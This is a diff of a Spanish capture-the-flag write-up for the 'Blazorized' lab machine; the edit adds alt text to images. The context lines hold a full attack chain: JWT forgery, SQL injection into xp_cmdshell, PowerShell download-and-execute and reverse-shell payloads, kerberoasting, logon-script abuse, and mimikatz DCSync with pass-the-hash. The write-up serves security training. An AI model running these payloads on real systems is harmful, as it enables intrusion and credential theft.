@@ -29,7 +29,7 @@ es hora de saber que puertos expuestos tiene la ip y lo vamos a guardar por si n
 ```bash
 nmap -p- --open -n -Pn -vvv --min-rate 3000 10.10.10.10 -oN allports
 ```
-<img src="/images/writeup-blazorized/2.png">
+<img src="/images/writeup-blazorized/2.png" alt="image">
 
 con estos puertos, parece un controlador de dominios de active directory además de un servicio web (antes que todo, lancemos los scripts básicos de reconocimiento de servicios de nmap)
 
@@ -37,7 +37,7 @@ para eso, usaremos el siguiente comando:
 ```bash
 nmap -p53,80,88,135,139,389,445,464,593... -sCV -n -Pn 10.10.10.10 -oN targeteds
 ```
-<img src="/images/writeup-blazorized/3.png">
+<img src="/images/writeup-blazorized/3.png" alt="image">
 
 vemos que efectivamente es un DC, por donde empezar?
 
@@ -46,7 +46,7 @@ vemos que de primeras, el puerto 80 nos redirecciona a un dominio, así que vamo
 10.10.10.10       blazorized.htb
 ```
 ahora, si visitamos la pagina:
-<img src="/images/writeup-blazorized/4.png">
+<img src="/images/writeup-blazorized/4.png" alt="image">
 
 vemos que la pagina ha sido creada con blazor webAssembly (de aquí el nombre de la maquina)
 
@@ -59,16 +59,16 @@ tambien tenemos /markdown que refleja todo lo que escribamos de un lado, intente
 hay un post al que no podemos acceder /digital gardens y otro llamado misc. links
 
 por el momento, podemos ver que viaja en esa solicitud de actualizaciones:
-<img src="/images/writeup-blazorized/5.png">
+<img src="/images/writeup-blazorized/5.png" alt="image">
 
 vemos que esta intentando acceder a un nombre de dominio que no apunta a ningún lado, entonces lo que haremos será agregarlo a la ip de la maquina en el /etc/hosts ***http://api.blazorized.htb
 
 oooh, vemos que ahora tenemos acceso a las otras 2 publicaciones de la pagina:
-<img src="/images/writeup-blazorized/6.png">
-<img src="/images/writeup-blazorized/7.png">
+<img src="/images/writeup-blazorized/6.png" alt="image">
+<img src="/images/writeup-blazorized/7.png" alt="image">
 
 ahora, después de pulsar el botón, vemos como se agregan nuevas cosas a la pagina:
-<img src="/images/writeup-blazorized/8.png">
+<img src="/images/writeup-blazorized/8.png" alt="image">
 
 mirando un poco, vemos que hay mucha información y guías, aparte de links a herramientas
 
@@ -92,7 +92,7 @@ for dll in $(cat dlls); do wget http://blazorized.htb/_framework/$dll; done
 esto hará mucha traya, pero nos descargara todo en unos segundos
 
 aunque luego de analizar todo , no encontramos nada interesante, asi que decidí volver al Burpsuite y ver si me había saltado algo y asi fue, cuando pulsamos el botón para que apareciera el contenido nuevo, se estaba enviando un token en base64 que al analizarlo con el decoder de bur, vemos que tiene información interesante sobe el email de un usuario:
-<img src="/images/writeup-blazorized/9.png">
+<img src="/images/writeup-blazorized/9.png" alt="image"> 
 
 superadmin@blazorized.htb
 
@@ -118,72 +118,72 @@ se va a crear un directorio artifacts, y debes entrar, alli ya ejecutaremos:
 ./ILSpy
 ```
 allí vamos a navegar hasta el helper y vemos que hay data interesante:
-<img src="/images/writeup-blazorized/10.png">
+<img src="/images/writeup-blazorized/10.png" alt="image">
 
 vemos un nuevo dominio: admin.blazorized.htb y lo agregaremos al /etc/hosts
 
 si analizamos las solicitudes que viajan en burpsuite, en el panel de administración:
-<img src="/images/writeup-blazorized/21.png">
+<img src="/images/writeup-blazorized/21.png" alt="image">
 
 no tenemos nada, haha pero, hay una herramienta en burpsuite para analizar trafico blazor:
-<img src="/images/writeup-blazorized/22.png">
+<img src="/images/writeup-blazorized/22.png" alt="image">
 
 
 dado la naturaleza de los paquetes de blazor, debemos seleccionar "filter settings" y agragar "other binary":
-<img src="/images/writeup-blazorized/23.png">
+<img src="/images/writeup-blazorized/23.png" alt="image">
 
 y veremos como aparecen otros paquetes type app:
-<img src="/images/writeup-blazorized/24.png">
+<img src="/images/writeup-blazorized/24.png" alt="image">
 
 ahora, eso lo enviaremos a la extensión que hemos añadido: click derecho > extensions > blazor trafic processor > send body to btp lap:
-<img src="/images/writeup-blazorized/25.png">
+<img src="/images/writeup-blazorized/25.png" alt="image">
 
 alli solo tenemos que desrealizar y veremos que información de utilidad podemos obtener de esos paquetes.
 
 después de analizar varios, lo único relevante es que la aplicación busca un jwt almacenado en nuestro navegador para un inicio automático:
-<img src="/images/writeup-blazorized/26.png">
+<img src="/images/writeup-blazorized/26.png" alt="image">
 
 y tenemos un nuevo dominio con un panel de autenticación, además, tenemos mucha información sobre el jwt (la key, data adicional, etc)
-<img src="/images/writeup-blazorized/11.png">
+<img src="/images/writeup-blazorized/11.png" alt="image">
 
 que vamos a hacer? vemos que toda la evidencia que tenemos hasta el momento nos lleva a pensar que intentaremos entrar al panel con el jwt
 
 1: vamos a capturar el jwt que tenemos al alcance que ya hemos visto desde burpsuite (cuando enviamos el update en la pagina principal):
-<img src="/images/writeup-blazorized/12.png">
+<img src="/images/writeup-blazorized/12.png" alt="image">
 
 2: vamos a analizarlo en la pagina https://jwt.io para poder usar la key encontrada o editarlo:
-<img src="/images/writeup-blazorized/13.png">
+<img src="/images/writeup-blazorized/13.png" alt="image">
 
 3: en ilspy vemos un valor que debe tener el token y tiene el mismo nombre de la pagina de administrador:
-<img src="/images/writeup-blazorized/14.png">
+<img src="/images/writeup-blazorized/14.png" alt="image">
 
 así que se lo vamos a añadir:
-<img src="/images/writeup-blazorized/15.png">
+<img src="/images/writeup-blazorized/15.png" alt="image">
 
 tambien usaremos el key que vemos en ilspy:
-<img src="/images/writeup-blazorized/15.png">
+<img src="/images/writeup-blazorized/15.png" alt="image">
 
 dado que el la key se usa para mantener la simetría y la valides de los jwt, para que los servidores lo puedan desrealizar correctamente:
-<img src="/images/writeup-blazorized/16.png">
+<img src="/images/writeup-blazorized/16.png" alt="image">
 
 ahora, si verificamos la fecha de caducidad:
-<img src="/images/writeup-blazorized/17.png">
+<img src="/images/writeup-blazorized/17.png"alt="image">
 
 ya esta caducado, pero solo necesitamos modificar la fecha porque tenemos la key:
-<img src="/images/writeup-blazorized/18.png">
+<img src="/images/writeup-blazorized/18.png" alt="image">
 
 como probamos si esto funciona?
 vamos a ir al navegador, a la pagina del admin y agregaremos el token en storage - cookies:
-<img src="/images/writeup-blazorized/19.png">
+<img src="/images/writeup-blazorized/19.png" alt="image">
 
 al recargar la pagina no funciono, y recordé que habíamos leído que lo estaba buscando de manera local, así que al agregarlo y recargar la pagina:
-<img src="/images/writeup-blazorized/20.png">
+<img src="/images/writeup-blazorized/20.png" alt="image">
 logramos acceder al panel
 
 ahora, lo que debemos hacer es empezar a enumerar la pagina, probar si se refleja algo, tenemos varias opciones para publicar en el blog
 
 después de mirar e intentar varias cosillas, vemos que tenemos un #SQLinjection en el comparador de títulos duplicados:
-<img src="/images/writeup-blazorized/27.png">
+<img src="/images/writeup-blazorized/27.png" alt="image">
 
 como sabemos? pues dice que hay 13 títulos con el mismo nombre, o sea, esta seleccionando todos los títulos
 
@@ -204,8 +204,8 @@ y ejecutar en el campo de inyección:
 ' ; EXEC xp_cmdshell 'certutil -urlcache -f http://10.10.10.10'; -- -
 ```
 y vemos que ha funcionado, tenemos ejecución remota de comandos:
-<img src="/images/writeup-blazorized/28.png">
-<img src="/images/writeup-blazorized/29.png">
+<img src="/images/writeup-blazorized/28.png" alt="image">
+<img src="/images/writeup-blazorized/29.png" alt="image">
 
 vamos a fabricar un payload que se descargue desde la maquina remota y se ejecute para que se nos envie una reverse shell. 
 
@@ -222,7 +222,7 @@ primero: vamos a guardar en un archivo el comando:
 Invoke-Expression ((New-Object Net.WebClient).DownloadString("http://10.10.10.10/script.ps1"))
 ```
 vamos a ir a revshell.com y vamos a crear una reverseshell ejecutable en powershell en base64:
-<img src="/images/writeup-blazorized/30.png">
+<img src="/images/writeup-blazorized/30.png" alt="image">
 
 y la vamos a guardar en el archivo script.ps1
 
@@ -246,7 +246,7 @@ ahora, vamos a ejecutar en el buscador vulnerable el comando de descarga/ejecuci
 '; EXEC xp_cmdshell 'powershell -e SQB....';-- -
 ```
 y: 
-<img src="/images/writeup-blazorized/31.png">
+<img src="/images/writeup-blazorized/31.png" alt="image">
 
 vamos a ir al directorio del usuario que somo actualmente, y allí tendremos la primera flag de usuario:
 ```powershell
@@ -303,16 +303,16 @@ y en otra terminal:
 bloodhound
 ```
 desplegara una ventana en la cual vas a iniciar sesión con las credenciales que haz configurado:
-<img src="/images/writeup-blazorized/32.png">
+<img src="/images/writeup-blazorized/32.png" alt="image">
 
 dentro de la aplicación, vas a cargar todos los archivos excepto**...computers.json** en mi caso porque se traba toda la carga de archivos, pero realmente no lo necesitamos
-<img src="/images/writeup-blazorized/33.png">
+<img src="/images/writeup-blazorized/33.png" alt="image">
 
 buscaremos al usuario comprometido: nu_1055
-<img src="/images/writeup-blazorized/34.png">
+<img src="/images/writeup-blazorized/34.png" alt="image">
 
 vamos a seleccionarlo como comprometido:
-<img src="/images/writeup-blazorized/35.png">
+<img src="/images/writeup-blazorized/35.png" alt="image">
 
 ya podemos buscar información basados en ese nodo comprometido.
 iremos a "Node Info"
@@ -320,12 +320,12 @@ iremos a "Node Info"
 buscando un poco, vemos que es miembro de varios grupos, así como los roles que tiene asignado (nada interesante)
 
 si buscamos mas, vemos que en "outbound object control" o sea: objeto sobre el cual tiene capacidad de controlar fuera de su propio ámbito tiene un permiso tipo "first degree object control" lo que significa que el usuario puede realizar acciones como modificar contraseñas o atributos del usuario que nos señala en la grafica:
-<img src="/images/writeup-blazorized/36.png">
+<img src="/images/writeup-blazorized/36.png" alt="image">
 
 mirando mas a detalle, tenemos el permiso *writeSPN* lo que nos permitiria modificar los *service principal names* asociados a la cuenta que son los identificadores para la autenticación #kerberos 
 
 la misma aplicación nos resume de que se trata este permiso y como podemos abusarlo en entornos windows:
-<img src="/images/writeup-blazorized/37.png">
+<img src="/images/writeup-blazorized/37.png" alt="image">
 
 mirando el modo de abusar de esto en windows, vemos que se nos sugiere un #kerberoastingAtack usando el comando set-domainObject de powerview y luego get-domainspnticket para recibir un ticket del servicio kerberos
 
@@ -371,7 +371,7 @@ lo que nos queda por hacer es guardar el hash en un archivo en nuestra maquina p
 ```bash
 hashcat hash.txt /usr/s.../rockyou.txt
 ```
-<img src="/images/writeup-blazorized/38.png">
+<img src="/images/writeup-blazorized/38.png" alt="image">
 
 vemos que la contrasena es: (Ni7856Do9854Ki05Ng0005 #)
 
@@ -407,7 +407,7 @@ para el usuario, he vuelto a bloodhound, y he buscado por los grupos a los que p
 viendo por el grupo *REMOTE_SUPPORT_ADMINISTRATORS* no vemos que otros usuarios pertenecientes tengan otras conexiones interesantes
 
 si vemos el grupo *REMOTE MANAGEMENT USERS* y miramos los "groups members" > "direct members" hay un usuario mas adicional a los ya comprometidos: *SSA_6010* e investigando a este usuario, es el punto final para poder comprometer el DC:
-<img src="/images/writeup-blazorized/40.png">
+<img src="/images/writeup-blazorized/40.png" alt="image">
 
 ya tenemos el objetivo, como sabemos cual es el script del que vamos a abusar?
 
@@ -418,10 +418,10 @@ podemos usar de nuevo la herramienta #netexec con el siguiente comando:
 netexec smb 10.10.10.10 -u rsa_4810 -p "(Ni...)"
 ```
 el nombre de usuario en minusculas
-<img src="/images/writeup-blazorized/41.png">
+<img src="/images/writeup-blazorized/41.png" alt="image">
 
 tenemos una carpeta compartida llamado *sysvol* que a sus ves si somos curiosos, vemos que se encuentra en C:/windows/
-<img src="/images/writeup-blazorized/42.png">
+<img src="/images/writeup-blazorized/42.png" alt="image">
 
 dentro de la ruta C:/Windows/SYSVOL/domain/scripts encontramos lo bueno
 son los scripts de inicio de sesión
@@ -432,7 +432,7 @@ icacls *
 ```
 vemos la información de los mismos y veremos que hay uno sobre el cual nuestro usuario tiene control total
 
-<img src="/images/writeup-blazorized/43.png">
+<img src="/images/writeup-blazorized/43.png" alt="image">
 
 tambien vemos podemos ver los mismos scripts en la ruta C:/Windows/SYSVOL/sysvol/blazorized.htb/scripts
 
@@ -474,13 +474,13 @@ python3 -m http.server 80
 ```bash
 rlwrap nc -lnvp 9001
 ```
-<img src="/images/writeup-blazorized/44.png">
+<img src="/images/writeup-blazorized/44.png" alt="image">
 
 ## Jugada Final:
 
 en bloodhound tenemos lo que necesitamos basado en los permisos de este usuario:
 
-<img src="/images/writeup-blazorized/45.png">
+<img src="/images/writeup-blazorized/45.png" alt="image">
 
 necesitamos #mimikatz para exfiltrar las credenciales de administrador
 
@@ -498,7 +498,7 @@ y usaremos el comando:
 .\mimikatz.exe "lsadump::dcsync /user:administrator" exit
 ```
  y eso nos devuelve un hash  ntlm que usaremos para iniciar sesión como administrador:
-<img src="/images/writeup-blazorized/46.png">
+<img src="/images/writeup-blazorized/46.png" alt="image">
 
 copiaremos y en nuestra maquina usaremos de nuevo *evil-winrm*
 ```bash
@@ -506,7 +506,7 @@ evil-wirm -i 10.10.10.10 -u administrator -H f55.....
 ```
 
 lo conseguimos:
-<img src="/images/writeup-blazorized/47.png">
+<img src="/images/writeup-blazorized/47.png" alt="image">
 ahora, podemos buscar la flag en el directorio "Desktop" del admin
 
 
@@ -525,4 +525,4 @@ nos vemos en la siguiente maquina!
 
 ## H4ck th3 W0rld
 
-<img src="/images/devil.jpg" style="border-radius:200px; width:100px;">
+<img src="/images/devil.jpg" style="border-radius:200px; width:100px;" alt="image">
